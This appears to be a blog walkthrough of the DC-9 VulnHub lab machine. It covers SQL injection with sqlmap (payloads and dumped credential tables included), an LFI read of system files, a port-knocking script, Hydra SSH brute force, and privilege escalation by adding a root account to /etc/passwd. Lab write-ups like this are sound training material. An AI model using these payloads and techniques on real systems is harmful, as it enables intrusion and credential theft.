---
author: "faizul"
title: "DC-9"
date: 2020-09-12T12:00:06+09:00
description: "DC-9 Vulnhub Machine Walkthrough"
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: faizul
image: images/vulnhub/vulnhub.png
tags: 
- pentest
- dc-9
- vulnhub
categories:
- writeup
---

```
Machine focus on SqlMap
```

## Recon


### Nmap
`sudo nmap -sSCV -A --script vuln -oA nmap/fulltcp-agressive -iL ip`


```code
# Nmap 7.80 scan initiated Wed Aug 26 23:29:47 2020 as: nmap -sSCV -A --script vuln -oA nmap/all-agressive -iL ip
Nmap scan report for dc-9 (192.168.43.182)
Host is up (0.00059s latency).
Not shown: 998 closed ports
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=dc-9
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://dc-9:80/manage.php
|     Form id: 
|     Form action: manage.php
|     
|     Path: http://dc-9:80/search.php
|     Form id: 
|_    Form action: results.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_  /includes/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_http-server-header: Apache/2.4.38 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|     	CVE-2020-11984	7.5	https://vulners.com/cve/CVE-2020-11984
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	CVE-2019-10097	6.0	https://vulners.com/cve/CVE-2019-10097
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	CVE-2019-0215	6.0	https://vulners.com/cve/CVE-2019-0215
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	CVE-2020-9490	5.0	https://vulners.com/cve/CVE-2020-9490
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-10081	5.0	https://vulners.com/cve/CVE-2019-10081
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	CVE-2020-11993	4.3	https://vulners.com/cve/CVE-2020-11993
|_    	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
MAC Address: 00:0C:29:36:A6:A5 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms dc-9 (192.168.43.182)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 26 23:30:39 2020 -- 1 IP address (1 host up) scanned in 52.90 seconds

```

### Gobuster
`gobuster dir -u http://192.168.43.182 -w /usr/share/wordlist/dirb/big.txt -o gobuster/enum-80`

- Result
```code
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/config.php (Status: 200)
/css (Status: 301)
/display.php (Status: 200)
/includes (Status: 301)
/index.php (Status: 200)
/logout.php (Status: 302)
/manage.php (Status: 200)
/results.php (Status: 200)
/search.php (Status: 200)
/server-status (Status: 403)
/session.php (Status: 302)
/welcome.php (Status: 302)
```

### ZAP
We can crawl the targeted website automatically with ZAP. 

![ddcaaaa179329ea77443e965d1457ee7.png](/images/vulnhub/dc-9/8753d18399ce405c93ad87b068bb7531.png)

Here, we can confirm there is SQLi vuln here. 


### Burpsuite
Lets capture 

#### Setup 

For Burpsuite capturing setup, im using foxyproxy on chromium and any request send to the web app will be intercepted by Burpsuite
![793ab00691a884bfc4898e67d0a8f676.png](/images/vulnhub/dc-9/1a8aa0aad1254cdf97f0295556393324.png)



![b5f199757d0ebaaa3df60506ffff8341.png](/images/vulnhub/dc-9/208741eb613548a59412d4a1696fa890.png)



![bec871981806844ddc6ee52dce9b5a33.png](/images/vulnhub/dc-9/f7eba68a5ce2459e81d6f4ba6a5a6c52.png)




![6ff873d798029298fdac856368214b44.png](/images/vulnhub/dc-9/f800b3f502fa4f6c99505de2f165462c.png)

Save the request on local folder for sqlmap usage later. 

```code
POST /results.php HTTP/1.1
Host: 192.168.43.182
Content-Length: 17
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.43.182
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.43.182/search.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=r0i61er653jmbqm0m323d3cdch
Connection: close

search=everything
```


### SQLmap
First, we will enumerate database version used in the victim using outopu from the post request we captured in Burpsuite. 
`sqlmap -r exploit/sql.txt --dbs --batch`

This will spill out the below output
```code
        ___                                                                                                                                                           
       __H__                                                                                                                                                          
 ___ ___[)]_____ ___ ___  {1.4.8#stable}                                                                                                                              
|_ -| . [.]     | .'| . |                                                                                                                                             
|___|_  [(]_|_|_|__,|  _|                                                                                                                                             
      |_|V...       |_|   http://sqlmap.org                                                                                                                           
                                                                                                                                                                      
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local,
 state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                       
                                                                                                                                                                      
[*] starting @ 03:59:42 /2020-08-27/                                                                                                                                  
                                                                                                                                                                      
[03:59:42] [INFO] parsing HTTP request from 'sql.txt'                                                                                                                 
[03:59:43] [INFO] testing connection to the target URL                                                                                                                
[03:59:43] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                                         
[03:59:43] [INFO] testing if the target URL content is stable                                                                                                         
[03:59:43] [INFO] target URL content is stable                                                                                                                        
[03:59:43] [INFO] testing if POST parameter 'search' is dynamic                                                                                                       
[03:59:43] [WARNING] POST parameter 'search' does not appear to be dynamic                                                                                            
[03:59:43] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable                                                                
[03:59:43] [INFO] testing for SQL injection on POST parameter 'search'                                                                                                
[03:59:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                                          
[03:59:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                                  
[03:59:44] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                         
[03:59:44] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                                                       
[03:59:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                 
[03:59:44] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                                 
[03:59:44] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'   
[03:59:44] [INFO] testing 'Generic inline queries'                                 
[03:59:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'             
[03:59:44] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[03:59:44] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[03:59:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'     
[04:00:05] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[04:00:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:00:05] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=everything' AND (SELECT 1362 FROM (SELECT(SLEEP(5)))zaWR) AND 'uSLv'='uSLv

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=everything' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a7871,0x4545774e6953647966686d62646d686e6c4b7a417a75626b6a566753615554586454517076484e4f,0x7162767871),NULL,NULL-- -
---
[04:00:05] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[04:00:05] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] Staff
[*] users

[04:00:05] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.43.182'

[*] ending @ 04:00:05 /2020-08-27/

```
From the output, we know that mysql/mariadb is used in this web app and there are 3 available database in this web app which are `information_schema`, `Staff`, and `users`. 

- dump Staff db
Dump Staff db with this command `sqlmap -r sqlmap/sql.txt -D Staff --dump | tee sqlmap/staff-db-dump.txt ` 

From here, we found something we can use for initial foothold later. This password hash can be crack using local tool or i prefer to use Crackstation. 

```code
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+
```



![95ff137d327702c07700cb771e3b7f49.png](/images/vulnhub/dc-9/3b6634d9624747a6b4e503eae7b1d6a8.png)

Cracked! The password for admin is `transorbital1`

- dump users db
```code
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+
```

Now, we have both admin and user creds, we start to login in `manage.php`. 



![6c091285e4d32b935215a239f8c844c8.png](/images/vulnhub/dc-9/f4063984808e4c2095ac084e40355390.png)

As usual, few things im going to test whenever i can is doing LFI test and few others such as SQLi but we already got that already and another would be XSS. 

Lets try this on the attacking browser for LFI test. `192.168.43.182/manage.php?file=../../../../etc/passwd`



![da1bed853bfd59112a2463523556520a.png](/images/vulnhub/dc-9/d22173255cee4476a447d47673f9f4f7.png)


## Initial Access / Initial Foothold

For initial access, i have been scratching my head for this untill i realise there is a filtered SSH on the nmap scan. 

Usually the port will open or eventually closed unless it need other method to bring it up?

For this part, we need to take a look at port knocking sections. According to this [site](https://linux.die.net/man/1/knockd) or linux manual page, knockd config reside on /etc/knockd.conf. 

We can use LFI to enumerate this if its really there. 

![f9a89d7c52d4ed9c43f5cbda35ca8205.png](/images/vulnhub/dc-9/3a8b915e37214577857cd6735856c1de.png)

The config is there, we are now moving to real port knocking application.

#### Knock, Knock, is SSH port there?

Before port knock
![27e7a4a0e7b817464629840ab1b342c8.png](/images/vulnhub/dc-9/3579a1b27303482995b92aa2ea08f303.png)


Port knocking using nmap and simple bash script
```bash
#!/bin/bash

for port in 7469 8475 9842
	do nmap -Pn --max-retries 0 -p $port 192.168.43.182
done
```


![d9c1421e6d6385e08e1c5dae59e3ccd7.png](/images/vulnhub/dc-9/3f44d384cff44f439ffc092825bfe1bc.png)


After port knock
![358c8c61fde2a85c9635af64d6eed5b7.png](/images/vulnhub/dc-9/5cdad0b2f9974826b7729b1f1afcd0e1.png)


So what is happening here is that we get important information when we enumerate knockd information using LFI. In order to do port knocking, there are proper sequence to do it. 

```code
[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
```

It is like when you are closing the door and only opne it to anyone that have secret code. For this machine, the sequence are `7469,8475 and 9842`

The bash script is simply store knock sequence as port variable and scan it using nmap each port per scan or knocking. 

Port 22 will open for gaining initial foothold once knocked.

Next, we going to use all collected username and password and do bruteforce to the ssh. 

Store all username and passoword in spearate file. We will let Hydra do the dirty work. 

`hydra -L loot/user.txt -P loot/password.txt ssh://192.168.43.182 -t 10 -I | tee loot/brute-ssh.txt`

![5c61504b671350837563236efc47f2fc.png](/images/vulnhub/dc-9/459e4b1d0dd040eaa649c0e38fb7c6f6.png)

**cracked password and username**
- chandlerb:UrAG0D!
- joeyt:Passw0rd
- janitor:Ilovepeepee

ssh chandlerb
```bash
The authenticity of host '192.168.43.182 (192.168.43.182)' can't be established.
ECDSA key fingerprint is SHA256:o2Ii/WX152zZCRlVrfXpNnX8mvNwYfOWhkMscAr+sMs.    
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes        
Warning: Permanently added '192.168.43.182' (ECDSA) to the list of known hosts. 
chandlerb@192.168.43.182's password:                                            
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64   
                                                                                
The programs included with the Debian GNU/Linux system are free software;       
the exact distribution terms for each program are described in the              
individual files in /usr/share/doc/*/copyright.                                 
                                                                                
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent               
permitted by applicable law. 
```

ssh joeyt
```bash
joeyt@192.168.43.182's password:                                                
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64   
                                                                                
The programs included with the Debian GNU/Linux system are free software;       
the exact distribution terms for each program are described in the              
individual files in /usr/share/doc/*/copyright.                                 
                                                                                
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent               
permitted by applicable law.                                                    
joeyt@dc-9:~$ ls                                                                
joeyt@dc-9:~$ ls -la                                                            
total 12                                                                        
drwx------  3 joeyt joeyt 4096 Aug 29 02:45 .                                   
drwxr-xr-x 19 root  root  4096 Dec 29  2019 ..                                  
lrwxrwxrwx  1 joeyt joeyt    9 Dec 29  2019 .bash_history -> /dev/null          
drwx------  3 joeyt joeyt 4096 Aug 29 02:45 .gnupg                              
joeyt@dc-9:~$ exit                                                              
logout                                                                          
Connection to 192.168.43.182 closed.
```

ssh janitor
```bash
janitor@192.168.43.182's password:                                              
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64   
                                                                                
The programs included with the Debian GNU/Linux system are free software;       
the exact distribution terms for each program are described in the              
individual files in /usr/share/doc/*/copyright.                                 
                                                                                
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent               
permitted by applicable law.                                                    
janitor@dc-9:~$ ls                                                              
janitor@dc-9:~$ ls -la                                                          
total 16                                                                        
drwx------  4 janitor janitor 4096 Aug 29 02:46 .                               
drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..                              
lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null      
drwx------  3 janitor janitor 4096 Aug 29 02:46 .gnupg                          
drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin              
janitor@dc-9:~$ cat .secrets-for-putin/                                         
cat: .secrets-for-putin/: Is a directory                                        
janitor@dc-9:~$ cat .secrets-for-putin/passwords-found-on-post-it-notes.txt     
BamBam01                                                                        
Passw0rd                                                                        
smellycats                                                                      
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
janitor@dc-9:~$ exit
logout
Connection to 192.168.43.182 closed.

```
On Janitor, we found new password some more. Add the new password to the cracked password then re-run the hydra again. 

re-crack
`hydra -L loot/user.txt -P loot/password.txt ssh://192.168.43.182 -t 10 -I | tee loot/re-brute-ssh.txt`

![8ae2f1c4882bc715afa58b0963675444.png](/images/vulnhub/dc-9/353b6719afef45918759724423e2ba61.png)



![3eb01de1d5bd22627a96e4e9c207cce9.png](/images/vulnhub/dc-9/3e864d32b1cd4ae1853395fe5f700589.png)



## Privilege Escalation

![cb198c4b70e0394f364429ae2b30e181.png](/images/vulnhub/dc-9/4f742577602440a59473892fb0794f6e.png)


![9261d95fc3ba82e8bd146a63b89de750.png](/images/vulnhub/dc-9/6f000d0e669347ccb067b290558e008b.png)


```python
#!/usr/bin/python                                                               
               
import sys                                                                
if len (sys.argv) != 3 :                                         
    print ("Usage: python test.py read append")                
    sys.exit (1)                                                 
else :                                                           
    f = open(sys.argv[1], "r")                                   
    output = (f.read())   
    f = open(sys.argv[2], "a") 
    f.write(output)
    f.close()
```

So basically what this script do is, first it have 2 arguments that it can accept. Then it will read one from first argument then append it to the next one. 

To gain root, lets create new account, let it append to the /etc/passwd and get root.  


```bash
fredf@dc-9:~$ openssl passwd -1 -salt fyezool fyezool
$1$fyezool$.vWu.gTMGAKT73babJKR00
```


Add new user:password:root/bash
`fyezool:$1$fyezool$.vWu.gTMGAKT73babJKR00:0:0:root/root:/bin/bash`

![c71999019c3719036624e324653e147c.png](/images/vulnhub/dc-9/8d3c5497dcdf4009bedcc1b05cf9a8eb.png)

Now, run `sudo /opt/devstuff/dist/test/test abc.txt /etc/passwd` 

To check if the new user is added, just run `cat /etc/password | grep fyezool`
![122537428c8edba8196e83740ae9fccc.png](/images/vulnhub/dc-9/5627f1900e2f4ab390356d814c587195.png)

su fyezool
password : fyezool
![d60fb1955dc395bde32130fe05d03855.png](/images/vulnhub/dc-9/6923c5eeeb5a42c582139731b5cbe2e2.png)

bash
cd /root
cat 

![96b80336407a19d27c45aceb27f21b2f.png](/images/vulnhub/dc-9/4f134355f16a4dacb8977e8973e1ac83.png)



- references 
	- https://medium.com/gits/vulnhub-dc-9-writeup-e00823c09a83
	- https://blog.mzfr.me/vulnhub-writeups/2019-12-25-DC9

